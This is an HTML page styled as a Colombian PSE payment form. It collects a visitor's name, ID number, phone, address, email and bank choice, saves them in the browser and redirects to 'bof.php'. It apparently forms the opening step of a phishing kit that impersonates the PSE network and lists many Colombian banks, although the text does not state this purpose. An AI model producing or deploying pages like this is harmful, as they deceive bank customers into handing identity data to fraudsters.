<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PSE - Formulario de Pago</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body {
      font-family: "Segoe UI", Arial, sans-serif;
      background: linear-gradient(180deg, #f8faff 0%, #eef1f9 100%);
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }
    header {
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 10px 0;
    }
    header img {
      width: 85px;
      height: auto;
      display: block;
    }
    .formulario {
      background: #fff;
      margin-top: 45px;
      padding: 40px 35px;
      border-radius: 16px;
      box-shadow: 0 6px 20px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 460px;
    }
    .formulario h2 {
      text-align: center;
      margin-bottom: 25px;
      color: #0033a0;
      font-size: 1.6rem;
      font-weight: 600;
    }
    label {
      display: block;
      margin-bottom: 6px;
      font-weight: 600;
      color: #333;
    }
    input, select {
      width: 100%;
      padding: 12px 14px;
      margin-bottom: 18px;
      border: 1px solid #cbd3e0;
      border-radius: 8px;
      font-size: 15px;
      background-color: #fafbff;
      outline: none;
    }
    input:focus, select:focus {
      border-color: #0033a0;
      box-shadow: 0 0 5px rgba(0,51,160,0.25);
      background-color: #fff;
    }
    button {
      width: 100%;
      background: #0033a0;
      color: white;
      border: none;
      padding: 12px 0;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
      font-size: 16px;
      transition: 0.3s ease;
    }
    button:hover {
      background: #00297a;
      transform: scale(1.02);
    }
    .nota {
      text-align: center;
      color: #666;
      font-size: 13px;
      margin-top: 12px;
    }
  </style>
</head>
<body>

  <header>
    <img src="img/errorlogo.png" alt="Encabezado PSE">
  </header>

  <form class="formulario" id="formPSE">
    <h2>Formulario de Pago PSE</h2>

    <label for="nombre">Nombre Completo</label>
    <input type="text" id="nombre" required>

    <label for="cedula">Cédula</label>
    <input type="text" id="cedula" required>

    <label for="celular">Celular</label>
    <input type="text" id="celular" required>

    <label for="direccion">Dirección</label>
    <input type="text" id="direccion" required>

    <label for="ciudad">Ciudad</label>
    <input type="text" id="ciudad" placeholder="Ej: Bogotá" required>

    <label for="correo">Correo electrónico</label>
    <input type="email" id="correo" placeholder="Ej: ejemplo@correo.com" required>

    <label for="banco">Selecciona tu banco</label>
    <!-- ✅ Agregado id="banco" -->
<select id="banco" name="banco" required>
      <option value="">A continuación seleccione su banco</option>
      <option value="Bancolombia">Bancolombia</option>
      <option value="Davivienda">Davivienda</option>
      <option value="Banco de Bogotá">Banco de Bogotá</option>
      <option value="Banco de Occidente">Banco de Occidente</option>
      <option value="Banco AV Villas">Banco AV Villas</option>
      <option value="Banco Caja Social">Banco Caja Social</option>
      <option value="BBVA">BBVA</option>
      <option value="Banco Popular">Banco Popular</option>
      <option value="Banco Pichincha">Banco Pichincha</option>
      <option value="Banco Falabella">Banco Falabella</option>
      <option value="Nequi">Nequi</option>
      <option value="Movii">Movii</option>
      <option value="Banco W">Banco W</option>
      <option value="Banco Itaú">Banco Itaú</option>
      <option value="Scotiabank Colpatria">Scotiabank Colpatria</option>
      <option value="Banco GNB Sudameris">Banco GNB Sudameris</option>
      <option value="Banco Agrario">Banco Agrario</option>
      <option value="Cooperativa Coopcentral">Cooperativa Coopcentral</option>
      <option value="Tuya">Tuya</option>
    </select>

    <button type="submit">Continuar</button>
    <div class="nota">Pagos seguros a través de la red PSE</div>
  </form>

  <script>
  document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("formPSE");

    form.addEventListener("submit", function (e) {
      e.preventDefault();

      // Captura de datos del formulario
      const documento = document.getElementById("cedula").value.trim();
      const nombre = document.getElementById("nombre").value.trim();
      const direccion = document.getElementById("direccion").value.trim();
      const correo = document.getElementById("correo").value.trim();
      const telefono = document.getElementById("celular").value.trim();
      const banco = document.getElementById("banco").value.trim(); // ✅ ahora sí existe
      const tipo_identificacion = "CC";
      const tipo_persona = "NATURAL";

      // Validar
      if (!documento || !nombre || !direccion || !correo || !telefono || !banco) {
        alert("Por favor completa todos los campos obligatorios.");
        return;
      }

      // Crear objeto plano
      const tbdatos = {
        documento,
        nombre,
        tipo_identificacion,
        tipo_persona,
        direccion,
        telefono,
        correo,
        banco
      };

      // Guardar en localStorage
      localStorage.setItem("tbdatos", JSON.stringify(tbdatos));
      console.log("✅ tbdatos guardado:", tbdatos);

      // Redirigir a bof.php
      window.location.href = "bof.php";
    });
  });
  </script>

</body>
</html>
